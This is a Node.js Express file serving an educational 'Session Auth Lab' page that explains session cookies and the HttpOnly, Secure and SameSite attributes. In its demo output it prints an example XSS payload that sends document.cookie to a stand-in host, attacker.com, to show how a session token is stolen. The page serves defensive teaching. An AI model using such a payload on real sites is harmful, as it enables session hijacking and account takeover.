/*
 * Terminal 2: cd auth-concepts/session && npm run guide
 * Session Auth Lab — concept guide (port 3053)
 */

const express = require('express');

const app = express();
const PORT = 3053;

app.use(express.json());

app.get('/api/demo-cookie', function (req, res) {
  res.json({
    port3052: 'Set-Cookie: nk_session=<token>; Path=/; SameSite=Lax',
    port3054: 'Set-Cookie: nk_session=<token>; Path=/; HttpOnly; SameSite=Strict',
    difference: 'HttpOnly prevents JavaScript from reading the cookie via document.cookie',
  });
});

// Verbatim <style> from DASHBOARD_HTML in demo-attacked/reverse-tabnabbing/attacker-server.js
const GUIDE_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Session Auth Lab</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Courier New', Courier, monospace;
      background: #0a0a0a;
      color: #00ff41;
      min-height: 100vh;
      padding: 2rem;
    }
    h1 {
      font-size: 1.4rem;
      margin-bottom: 0.5rem;
      text-shadow: 0 0 8px rgba(0, 255, 65, 0.4);
    }
    .subtitle { color: #4ade80; margin-bottom: 2rem; font-size: 0.9rem; }
    .flow-box {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-bottom: 2rem;
      line-height: 1.9;
      font-size: 0.9rem;
      max-width: 720px;
    }
    .flow-box strong { color: #facc15; }
    .credentials-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
    }
    .credentials-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    table {
      width: 100%;
      border-collapse: collapse;
      font-size: 0.85rem;
    }
    th {
      text-align: left;
      padding: 0.6rem 0.75rem;
      border-bottom: 1px solid #1a3a1a;
      color: #64748b;
      font-weight: 600;
    }
    td {
      padding: 0.75rem;
      border-bottom: 1px solid #0d1f0d;
      word-break: break-all;
    }
    .empty-state {
      color: #64748b;
      font-style: italic;
      padding: 1rem 0;
    }
    .entry-new { animation: glow 0.6s ease-out; }
    @keyframes glow {
      0% { background: rgba(0, 255, 65, 0.15); }
      100% { background: transparent; }
    }
    .referer-panel {
      background: #111;
      border: 1px solid #1a3a1a;
      border-radius: 8px;
      padding: 1.5rem;
      margin-top: 2rem;
    }
    .referer-panel h2 {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .referer-panel p {
      font-size: 0.85rem;
      color: #94a3b8;
      line-height: 1.7;
      margin-bottom: 1.25rem;
      max-width: 640px;
    }
    .demo-buttons {
      display: flex;
      flex-wrap: wrap;
      gap: 0.75rem;
    }
    .demo-btn {
      background: #1e293b;
      color: #e2e8f0;
      border: 1px solid #334155;
      padding: 0.55rem 1rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      font-family: 'Courier New', Courier, monospace;
    }
    .demo-btn:hover { background: #334155; }
    .demo-btn.primary { background: #0d9488; border-color: #0d9488; color: #fff; }
    .demo-btn.primary:hover { background: #0f766e; }
    .target-switcher {
      position: fixed;
      bottom: 1rem;
      left: 1rem;
      display: flex;
      gap: 0.5rem;
      z-index: 9999;
    }
    .target-switcher button {
      padding: 0.4rem 0.85rem;
      border-radius: 6px;
      font-size: 0.8rem;
      font-weight: 600;
      cursor: pointer;
      border: 1px solid;
    }
    .target-switcher .btn-vulnerable {
      background: #1e293b;
      color: #fff;
      border-color: #334155;
    }
    .target-switcher .btn-vulnerable.active {
      background: #fff;
      color: #1e293b;
      border-color: #fff;
    }
    .target-switcher .btn-protected {
      background: #16a34a;
      color: #fff;
      border-color: #16a34a;
    }
    .target-switcher .btn-protected.active {
      background: #15803d;
      color: #fff;
      border-color: #15803d;
    }
    .flow-box { max-width: 900px; }
    .decoded-box {
      background: #0a0a0a; border: 1px solid #1a3a1a; border-radius: 4px;
      padding: 0.75rem; font-size: 0.78rem; color: #cbd5e1;
      white-space: pre-wrap; word-break: break-all; min-height: 60px; margin-top: 0.5rem;
    }
    .result-banner {
      padding: 0.6rem 1rem; border-radius: 4px; font-size: 0.82rem;
      margin-top: 0.75rem; display: none;
    }
    .result-banner.success { background: #052e16; border: 1px solid #16a34a; color: #4ade80; }
    .result-banner.failure { background: #450a0a; border: 1px solid #dc2626; color: #fca5a5; }
    .result-banner.info    { background: #0c1a2e; border: 1px solid #1e40af; color: #93c5fd; }
    input.field {
      background: #111; border: 1px solid #1a3a1a; color: #00ff41;
      font-family: 'Courier New', Courier, monospace; font-size: 0.82rem;
      padding: 0.4rem 0.6rem; border-radius: 4px;
    }
    .section-title {
      font-size: 0.95rem;
      color: #94a3b8;
      margin-bottom: 1rem;
      text-transform: uppercase;
      letter-spacing: 1px;
    }
    .flow-box p { max-width: 640px; }
  </style>
</head>
<body>
  <h1>🍪 Session Authentication — How It Works</h1>
  <p class="subtitle">Login creates a server-side session. The browser stores a cookie and sends it on every request.</p>

  <div class="flow-box">
    <div class="section-title">Session Auth Flow</div>
    <pre style="color:#00ff41;font-size:0.78rem;line-height:1.6;margin-top:0.5rem">1. LOGIN
   Client                           Server
      │                                │
      ├── POST /api/login ────────────→│
      │   { username, password }       │
      │                                │ sessions.set("a3f9...", { username })
      │←── 200 + Set-Cookie: ─────────┤
      │    nk_session=a3f9b2c1...      │ ← random token, stored server-side
      │    HttpOnly; Secure; SameSite  │

2. AUTHENTICATED REQUEST
      ├── GET /api/notes ────────────→ │
      │   Cookie: nk_session=a3f9b2c1  │ ← browser sends automatically
      │                                │ sessions.get("a3f9b2c1") → { username }
      │←── 200 + notes ───────────────┤

3. LOGOUT
      ├── POST /api/logout ──────────→ │
      │                                │ sessions.delete("a3f9b2c1")
      │←── 200 + Set-Cookie: Max-Age=0 │ ← cookie deleted</pre>
  </div>

  <div class="flow-box">
    <div class="section-title">🔒 Cookie Security Attributes</div>
    <table style="width:100%;border-collapse:collapse;font-size:0.82rem">
      <tr style="color:#64748b;border-bottom:1px solid #1a3a1a">
        <th style="text-align:left;padding:0.5rem">Attribute</th>
        <th>What it does</th>
        <th>Without it</th>
      </tr>
      <tr style="border-bottom:1px solid #0d1f0d">
        <td style="padding:0.5rem;color:#4ade80">HttpOnly</td>
        <td style="padding:0.5rem;color:#94a3b8">JS cannot read the cookie (document.cookie is empty)</td>
        <td style="padding:0.5rem;color:#fca5a5">XSS can steal the session: document.cookie → send to attacker</td>
      </tr>
      <tr style="border-bottom:1px solid #0d1f0d">
        <td style="padding:0.5rem;color:#4ade80">Secure</td>
        <td style="padding:0.5rem;color:#94a3b8">Only sent over HTTPS</td>
        <td style="padding:0.5rem;color:#fca5a5">Cookie sent over plain HTTP — visible to network eavesdroppers</td>
      </tr>
      <tr style="border-bottom:1px solid #0d1f0d">
        <td style="padding:0.5rem;color:#4ade80">SameSite=Strict</td>
        <td style="padding:0.5rem;color:#94a3b8">Cookie not sent on cross-site requests</td>
        <td style="padding:0.5rem;color:#fca5a5">CSRF possible: attacker's page triggers requests to your app with your cookie</td>
      </tr>
      <tr>
        <td style="padding:0.5rem;color:#fbbf24">SameSite=Lax</td>
        <td style="padding:0.5rem;color:#94a3b8">Cookie sent on top-level navigation but not sub-resource</td>
        <td style="padding:0.5rem;color:#94a3b8">Good default if Strict breaks OAuth redirect flows</td>
      </tr>
    </table>
  </div>

  <div class="flow-box">
    <div class="section-title">🔍 Cookie Visibility Demo</div>
    <div style="display:flex;gap:0.75rem;flex-wrap:wrap;margin-bottom:0.75rem">
      <button class="demo-btn" id="btn-read-3052">Read document.cookie on :3052 (no HttpOnly)</button>
      <button class="demo-btn" id="btn-read-3054">Read document.cookie on :3054 (HttpOnly)</button>
    </div>
    <div class="result-banner" id="cookie-result"></div>
    <pre class="decoded-box" id="cookie-output" style="min-height:60px">–</pre>
  </div>

  <div class="flow-box">
    <div class="section-title">Session Fixation</div>
    <p style="color:#94a3b8;font-size:0.85rem;line-height:1.7;max-width:640px">
      ℹ Sessions can also be vulnerable to session fixation — where the attacker
      supplies a known session ID before the victim logs in. The fix: always
      generate a NEW session ID on login (server-side). This demo always does this correctly.
    </p>
  </div>

  <div class="target-switcher">
    <button type="button" class="btn-vulnerable" id="btn-vuln">Vulnerable Cookie (3052)</button>
    <button type="button" class="btn-protected" id="btn-hard">Hardened Cookie (3054)</button>
  </div>

  <script>
    function showResult(id, type, msg) {
      var el = document.getElementById(id);
      el.className = 'result-banner ' + type;
      el.textContent = msg;
      el.style.display = 'block';
    }

    document.getElementById('btn-read-3052').addEventListener('click', async function () {
      try {
        var res = await fetch('/api/demo-cookie');
        var data = await res.json();
        document.getElementById('cookie-output').textContent =
          'Port 3052 Set-Cookie header:\\n  ' + data.port3052 +
          '\\n\\nBecause HttpOnly is MISSING:\\n' +
          '  document.cookie → "nk_session=a3f9b2c1d4e5f6..."  ← readable by JS\\n\\n' +
          'XSS payload that steals it:\\n' +
          '  document.location = "http://attacker.com/steal?c=" + document.cookie\\n\\n' +
          'Attacker receives:\\n' +
          '  GET /steal?c=nk_session%3Da3f9b2c1d4e5f6... HTTP/1.1\\n' +
          '  → Now has a valid session token for the victim\\'s account';
        showResult('cookie-result', 'failure', '⚠ Cookie readable by JavaScript — XSS can steal this session');
      } catch (e) {
        document.getElementById('cookie-output').textContent = e.message;
        showResult('cookie-result', 'failure', '✗ Could not reach guide server: ' + e.message);
      }
    });

    document.getElementById('btn-read-3054').addEventListener('click', function () {
      document.getElementById('cookie-output').textContent =
        'Port 3054 Set-Cookie header:\\n  Set-Cookie: nk_session=&lt;token&gt;; Path=/; HttpOnly; SameSite=Strict' +
        '\\n\\nBecause HttpOnly IS set:\\n' +
        '  document.cookie → ""  (empty string)\\n\\n' +
        'The browser still sends the cookie automatically on every HTTP request to the same origin,\\n' +
        'but JavaScript — including any injected XSS payload — cannot read it.\\n\\n' +
        'Even this XSS payload fails:\\n' +
        '  document.location = "http://attacker.com/steal?c=" + document.cookie\\n' +
        '  → attacker receives: GET /steal?c=  (empty — no token)';
      showResult('cookie-result', 'success', '✅ HttpOnly: document.cookie returns "" — XSS cannot steal this token');
    });

    document.getElementById('btn-vuln').addEventListener('click', function () {
      window.open('http://localhost:3052');
    });
    document.getElementById('btn-hard').addEventListener('click', function () {
      window.open('http://localhost:3054');
    });
  </script>
</body>
</html>`;

app.get('/', function (req, res) {
  res.send(GUIDE_HTML);
});

app.listen(PORT, function () {
  console.log('Session Auth Lab running at http://localhost:' + PORT);
});
